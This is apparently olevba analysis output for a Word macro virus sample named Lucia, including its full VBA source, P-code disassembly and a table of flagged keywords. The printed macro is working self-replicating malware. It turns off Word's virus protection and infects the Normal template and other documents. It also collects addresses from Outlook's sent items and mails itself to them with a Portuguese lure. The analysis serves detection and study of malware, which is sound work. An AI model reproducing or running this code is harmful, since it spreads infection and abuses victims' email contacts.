olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Lucia
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Lucia - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit 'Cod
Private Declare Function RasEnumConnections Lib "RasApi32.dll" Alias "RasEnumConnectionsA" (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long
Private Declare Function RasGetConnectStatus Lib "RasApi32.dll" Alias "RasGetConnectStatusA" (ByVal hRasCon As Long, lpStatus As Any) As Long
Private Const RAS95_MaxEntryName = 256: Private Const RAS95_MaxDeviceType = 16: Private Const RAS95_MaxDeviceName = 32
Private Type RASCONNSTATUS95: dwSize As Long: RasConnState As Long: dwError As Long: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type
Private Type RASCONN95: dwSize As Long: hRasCon As Long: szEntryName(RAS95_MaxEntryName) As Byte: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type
Dim Copia As Boolean
Private Sub Document_New()
On Error Resume Next
    Copia = True: Document_Open
End Sub
Private Sub Document_Open()
On Error Resume Next
Dim TRasCon(255) As RASCONN95, Lg As Long, lPcon As Long, RetVal As Long, Tstatus As RASCONNSTATUS95
Dim A As Object, M As Object, Envia As Object, U As Object, Nao As Boolean, Doc As Object, F As Object
Dim A2 As Integer, I As Integer, Conteudo As String, Email As New Collection, I1 As Integer
Dim D As Document, Appli As New Application, Macro As String, IsConnected As Boolean
    Application.EnableCancelKey = wdCancelDisabled
    With Options
        .ConfirmConversions = False: .VirusProtection = False: .SaveNormalPrompt = False
    End With
    A2 = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    Macro = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, A2)
    Set Doc = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    Conteudo = Doc.Lines(1, 1)
    If Conteudo <> "Option Explicit 'Cod" Then
        If Conteudo <> "" Then Doc.DeleteLines 1, Doc.CountOfLines
        Doc.InsertLines 1, Macro
        With Dialogs(wdDialogFileSummaryInfo): .Title = "LUCIA": .Author = "LUCIA": .Execute: End With
        If ActiveDocument.Saved = False And UCase(Right(ActiveDocument.FullName, 3)) = "DOC" Then ActiveDocument.Save
    End If
    If Dir(Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117") <> "" Then
        Exit Sub
    End If
    If Copia Then Exit Sub
    
    TRasCon(0).dwSize = 412
    Lg = 256 * TRasCon(0).dwSize
    RetVal = RasEnumConnections(TRasCon(0), Lg, lPcon)
    Tstatus.dwSize = 160
    RetVal = RasGetConnectStatus(TRasCon(0).hRasCon, Tstatus)
    IsConnected = (Tstatus.RasConnState = &H2000)
    Set A = CreateObject("Outlook.Application")
    If Err.Number <> 0 Or Not IsConnected Then
        Open Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117" For Output As #1
        Close 1
        Set F = Application.FileSearch
        F.FileName = "*.doc"
        F.LookIn = Options.DefaultFilePath(wdDocumentsPath)
        F.SearchSubFolders = False
        F.Execute
        A2 = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If F.FoundFiles.Count > 0 Then
            For I1 = 1 To F.FoundFiles.Count
                Set D = Appli.Documents.Open(F.FoundFiles(I1))
            Next I1
        End If
        Kill Options.DefaultFilePath(wdDocumentsPath) & "\UT987456.117"
    Else
        Set U = A.GetNamespace("MAPI"): Set M = U.GetDefaultFolder(5)
        For I = 1 To M.Items.Count
            Conteudo = Trim(M.Items(I).To)
            If Left(Conteudo, 1) = "'" And Right(Conteudo, 1) = "'" Then Conteudo = Mid(Conteudo, 2, Len(Conteudo) - 2)
            If Conteudo Like "*@*" And Trim(Conteudo) <> "" Then
                If Email.Count <> 0 Then
                    For A2 = 1 To Email.Count
                        If Conteudo = Email.Item(A2) Then
                            Nao = True: Exit For
                        End If
                    Next
                End If
                If Not Nao Then Email.Add Conteudo
            End If
            Nao = False
        Next
        For I = 1 To Email.Count
            Set Envia = A.CreateItem(0)
            With Envia
                .Subject = "Mensagem para você": .To = Email.Item(I): .Body = "Quando tiver tempo, de uma olhada neste documento. Até mais...": .Attachments.Add ActiveDocument.FullName, 1, 1, "Documento": .Send
            End With
            Set Envia = Nothing
        Next
    End If
    Set Doc = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    Conteudo = Doc.Lines(1, 1)
    If Conteudo <> "Option Explicit 'Cod" Then
        If Conteudo <> "" Then Doc.DeleteLines 1, Doc.CountOfLines
        For I = 13 To A2
            Conteudo = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(I, 1)
            Doc.InsertLines I, Conteudo
        Next I
        Doc.InsertLines 1, "Private Sub Document_Open()"
        Doc.InsertLines 1, "End Sub"
        Doc.InsertLines 1, "    Copia = True: Document_Open"
        Doc.InsertLines 1, "On Error Resume Next"
        Doc.InsertLines 1, "Private Sub Document_New()"
        Doc.InsertLines 1, "Dim Copia As Boolean"
        Doc.InsertLines 1, "Private Type RASCONN95: dwSize As Long: hRasCon As Long: szEntryName(RAS95_MaxEntryName) As Byte: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
        Doc.InsertLines 1, "Private Type RASCONNSTATUS95: dwSize As Long: RasConnState As Long: dwError As Long: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
        Doc.InsertLines 1, "Private Const RAS95_MaxEntryName = 256: Private Const RAS95_MaxDeviceType = 16: Private Const RAS95_MaxDeviceName = 32"
        Doc.InsertLines 1, "Private Declare Function RasGetConnectStatus Lib " & Chr(34) & "RasApi32.dll" & Chr(34) & " Alias " & Chr(34) & "RasGetConnectStatusA" & Chr(34) & " (ByVal hRasCon As Long, lpStatus As Any) As Long"
        Doc.InsertLines 1, "Private Declare Function RasEnumConnections Lib " & Chr(34) & "RasApi32.dll" & Chr(34) & " Alias " & Chr(34) & "RasEnumConnectionsA" & Chr(34) & " (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long"
        Doc.InsertLines 1, "Option Explicit 'Cod"
        NormalTemplate.Save
    End If
    Set A = Nothing: Set M = Nothing: Set Envia = Nothing: Set U = Nothing: Set Doc = Nothing: Appli.Quit wdWordDocument: Set Appli = Nothing: Set F = Nothing
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Lucia
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10989 bytes
' Line #0:
' 	Option  (Explicit)
' 	QuoteRem 0x0010 0x0003 "Cod"
' Line #1:
' 	FuncDefn (Private Declare Function RasEnumConnections Lib "RasApi32.dll" (lpRasCon As , lpcb As Long, lpcConnections As Long) As Long)
' Line #2:
' 	FuncDefn (Private Declare Function RasGetConnectStatus Lib "RasApi32.dll" (ByVal hRasCon As Long, lpStatus As ) As Long)
' Line #3:
' 	Dim (Private Const) 
' 	LitDI2 0x0100 
' 	VarDefn RAS95_MaxEntryName
' 	BoS 0x0000 
' 	Dim (Private Const) 
' 	LitDI2 0x0010 
' 	VarDefn RAS95_MaxDeviceType
' 	BoS 0x0000 
' 	Dim (Private Const) 
' 	LitDI2 0x0020 
' 	VarDefn RAS95_MaxDeviceName
' Line #4:
' 	Type (Private) RASCONNSTATUS95
' 	BoS 0x0000 
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' 	BoS 0x0000 
' 	DimImplicit 
' 	VarDefn RasConnState (As Long)
' 	BoS 0x0000 
' 	DimImplicit 
' 	VarDefn dwError (As Long)
' 	BoS 0x0000 
' 	DimImplicit 
' 	OptionBase 
' 	Ld RAS95_MaxDeviceType 
' 	VarDefn szDeviceType (As Byte)
' 	BoS 0x0000 
' 	DimImplicit 
' 	OptionBase 
' 	Ld RAS95_MaxDeviceName 
' 	VarDefn szDeviceName (As Byte)
' 	BoS 0x0000 
' 	EndType 
' Line #5:
' 	Type (Private) RASCONN95
' 	BoS 0x0000 
' 	DimImplicit 
' 	VarDefn dwSize (As Long)
' 	BoS 0x0000 
' 	DimImplicit 
' 	VarDefn hRasCon (As Long)
' 	BoS 0x0000 
' 	DimImplicit 
' 	OptionBase 
' 	Ld RAS95_MaxEntryName 
' 	VarDefn szEntryName (As Byte)
' 	BoS 0x0000 
' 	DimImplicit 
' 	OptionBase 
' 	Ld RAS95_MaxDeviceType 
' 	VarDefn szDeviceType (As Byte)
' 	BoS 0x0000 
' 	DimImplicit 
' 	OptionBase 
' 	Ld RAS95_MaxDeviceName 
' 	VarDefn szDeviceName (As Byte)
' 	BoS 0x0000 
' 	EndType 
' Line #6:
' 	Dim 
' 	VarDefn Copia (As Boolean)
' Line #7:
' 	FuncDefn (Private Sub Document_New())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	LitVarSpecial (True)
' 	St Copia 
' 	BoS 0x0000 
' 	ArgsCall Document_Open 0x0000 
' Line #10:
' 	EndSub 
' Line #11:
' 	FuncDefn (Private Sub Document_Open())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00FF 
' 	VarDefn TRasCon (As type_000000F8)
' 	VarDefn Lg (As Long)
' 	VarDefn lPcon (As Long)
' 	VarDefn RetVal (As Long)
' 	VarDefn Tstatus (As RASCONNSTATUS95)
' Line #14:
' 	Dim 
' 	VarDefn A (As Object)
' 	VarDefn M (As Object)
' 	VarDefn Envia (As Object)
' 	VarDefn U (As Object)
' 	VarDefn Nao (As Boolean)
' 	VarDefn Doc (As Object)
' 	VarDefn False (As Object)
' Line #15:
' 	Dim 
' 	VarDefn A2 (As Integer)
' 	VarDefn I (As Integer)
' 	VarDefn Conteudo (As String)
' 	VarDefn Email (New As Collection)
' 	VarDefn I1 (As Integer)
' Line #16:
' 	Dim 
' 	VarDefn D (As Document)
' 	VarDefn Appli (New As Application)
' 	VarDefn Macro (As String)
' 	VarDefn IsConnected (As Boolean)
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #20:
' 	EndWith 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St A2 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld A2 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Macro 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Doc 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	ArgsMemLd Lines 0x0002 
' 	St Conteudo 
' Line #25:
' 	Ld Conteudo 
' 	LitStr 0x0014 "Option Explicit 'Cod"
' 	Ne 
' 	IfBlock 
' Line #26:
' 	Ld Conteudo 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd CountOfLines 
' 	Ld Doc 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #27:
' 	LitDI2 0x0001 
' 	Ld Macro 
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #28:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0005 "LUCIA"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0005 "LUCIA"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000D "\UT987456.117"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #32:
' 	ExitSub 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld Copia 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #35:
' Line #36:
' 	LitDI2 0x019C 
' 	LitDI2 0x0000 
' 	ArgsLd TRasCon 0x0001 
' 	MemSt dwSize 
' Line #37:
' 	LitDI2 0x0100 
' 	LitDI2 0x0000 
' 	ArgsLd TRasCon 0x0001 
' 	MemLd dwSize 
' 	Mul 
' 	St Lg 
' Line #38:
' 	LitDI2 0x0000 
' 	ArgsLd TRasCon 0x0001 
' 	Ld Lg 
' 	Ld lPcon 
' 	ArgsLd RasEnumConnections 0x0003 
' 	St RetVal 
' Line #39:
' 	LitDI2 0x00A0 
' 	Ld Tstatus 
' 	MemSt dwSize 
' Line #40:
' 	LitDI2 0x0000 
' 	ArgsLd TRasCon 0x0001 
' 	MemLd hRasCon 
' 	Ld Tstatus 
' 	ArgsLd RasGetConnectStatus 0x0002 
' 	St RetVal 
' Line #41:
' 	Ld Tstatus 
' 	MemLd RasConnState 
' 	LitHI2 0x2000 
' 	Eq 
' 	Paren 
' 	St IsConnected 
' Line #42:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set A 
' Line #43:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld IsConnected 
' 	Not 
' 	Or 
' 	IfBlock 
' Line #44:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000D "\UT987456.117"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #45:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #46:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set False 
' Line #47:
' 	LitStr 0x0005 "*.doc"
' 	Ld False 
' 	MemSt FileName 
' Line #48:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	Ld False 
' 	MemSt LookIn 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld False 
' 	MemSt SearchSubFolders 
' Line #50:
' 	Ld False 
' 	ArgsMemCall Execute 0x0000 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St A2 
' Line #52:
' 	Ld False 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #53:
' 	StartForVariable 
' 	Ld I1 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld False 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #54:
' 	SetStmt 
' 	Ld I1 
' 	Ld False 
' 	ArgsMemLd FoundFiles 0x0001 
' 	Ld Appli 
' 	MemLd Documents 
' 	ArgsMemLd Option 0x0001 
' 	Set D 
' Line #55:
' 	StartForVariable 
' 	Ld I1 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000D "\UT987456.117"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	ElseBlock 
' Line #59:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld A 
' 	ArgsMemLd GetNamespace 0x0001 
' 	Set U 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitDI2 0x0005 
' 	Ld U 
' 	ArgsMemLd GetDefaultFolder 0x0001 
' 	Set M 
' Line #60:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld M 
' 	MemLd Items 
' 	MemLd Count 
' 	For 
' Line #61:
' 	Ld I 
' 	Ld M 
' 	ArgsMemLd Items 0x0001 
' 	MemLd True 
' 	ArgsLd Trim 0x0001 
' 	St Conteudo 
' Line #62:
' 	Ld Conteudo 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Ld Conteudo 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Conteudo 
' 	LitDI2 0x0002 
' 	Ld Conteudo 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St Conteudo 
' 	EndIf 
' Line #63:
' 	Ld Conteudo 
' 	LitStr 0x0003 "*@*"
' 	Like 
' 	Ld Conteudo 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #64:
' 	Ld Email 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld A2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Email 
' 	MemLd Count 
' 	For 
' Line #66:
' 	Ld Conteudo 
' 	Ld A2 
' 	Ld Email 
' 	ArgsMemLd Item 0x0001 
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitVarSpecial (True)
' 	St Nao 
' 	BoS 0x0000 
' 	ExitFor 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	StartForVariable 
' 	Next 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Ld Nao 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld Conteudo 
' 	Ld Email 
' 	ArgsMemCall Add 0x0001 
' 	EndIf 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	LitVarSpecial (False)
' 	St Nao 
' Line #74:
' 	StartForVariable 
' 	Next 
' Line #75:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Email 
' 	MemLd Count 
' 	For 
' Line #76:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld A 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Envia 
' Line #77:
' 	StartWithExpr 
' 	Ld Envia 
' 	With 
' Line #78:
' 	LitStr 0x0012 "Mensagem para você"
' 	MemStWith Subject 
' 	BoS 0x0000 
' 	Ld I 
' 	Ld Email 
' 	ArgsMemLd Item 0x0001 
' 	MemStWith True 
' 	BoS 0x0000 
' 	LitStr 0x003E "Quando tiver tempo, de uma olhada neste documento. Até mais..."
' 	MemStWith Body 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "Documento"
' 	MemLdWith Attachments 
' 	ArgsMemCall Add 0x0004 
' 	BoS 0x0000 
' 	ArgsMemCallWith Send 0x0000 
' Line #79:
' 	EndWith 
' Line #80:
' 	SetStmt 
' 	LitNothing 
' 	Set Envia 
' Line #81:
' 	StartForVariable 
' 	Next 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set Doc 
' Line #84:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	ArgsMemLd Lines 0x0002 
' 	St Conteudo 
' Line #85:
' 	Ld Conteudo 
' 	LitStr 0x0014 "Option Explicit 'Cod"
' 	Ne 
' 	IfBlock 
' Line #86:
' 	Ld Conteudo 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd CountOfLines 
' 	Ld Doc 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #87:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x000D 
' 	Ld A2 
' 	For 
' Line #88:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Conteudo 
' Line #89:
' 	Ld I 
' 	Ld Conteudo 
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #90:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' 	LitDI2 0x0001 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #92:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "End Sub"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' 	LitDI2 0x0001 
' 	LitStr 0x001F "    Copia = True: Document_Open"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #94:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #95:
' 	LitDI2 0x0001 
' 	LitStr 0x001A "Private Sub Document_New()"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #96:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Dim Copia As Boolean"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #97:
' 	LitDI2 0x0001 
' 	LitStr 0x00C0 "Private Type RASCONN95: dwSize As Long: hRasCon As Long: szEntryName(RAS95_MaxEntryName) As Byte: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #98:
' 	LitDI2 0x0001 
' 	LitStr 0x00B3 "Private Type RASCONNSTATUS95: dwSize As Long: RasConnState As Long: dwError As Long: szDeviceType(RAS95_MaxDeviceType) As Byte: szDeviceName(RAS95_MaxDeviceName) As Byte: End Type"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #99:
' 	LitDI2 0x0001 
' 	LitStr 0x0076 "Private Const RAS95_MaxEntryName = 256: Private Const RAS95_MaxDeviceType = 16: Private Const RAS95_MaxDeviceName = 32"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #100:
' 	LitDI2 0x0001 
' 	LitStr 0x0031 "Private Declare Function RasGetConnectStatus Lib "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "RasApi32.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 " Alias "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0014 "RasGetConnectStatusA"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0031 " (ByVal hRasCon As Long, lpStatus As Any) As Long"
' 	Concat 
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #101:
' 	LitDI2 0x0001 
' 	LitStr 0x0030 "Private Declare Function RasEnumConnections Lib "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "RasApi32.dll"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 " Alias "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "RasEnumConnectionsA"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0040 " (lpRasCon As Any, lpcb As Long, lpcConnections As Long) As Long"
' 	Concat 
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #102:
' 	LitDI2 0x0001 
' 	LitStr 0x0014 "Option Explicit 'Cod"
' 	Ld Doc 
' 	ArgsMemCall InsertLines 0x0002 
' Line #103:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	SetStmt 
' 	LitNothing 
' 	Set A 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set M 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set Envia 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set U 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set Doc 
' 	BoS 0x0000 
' 	Ld wdWordDocument 
' 	Ld Appli 
' 	ArgsMemCall Quit 0x0001 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set Appli 
' 	BoS 0x0000 
' 	SetStmt 
' 	LitNothing 
' 	Set False 
' Line #106:
' 	EndSub 
' Line #107:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RasApi32.dll        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

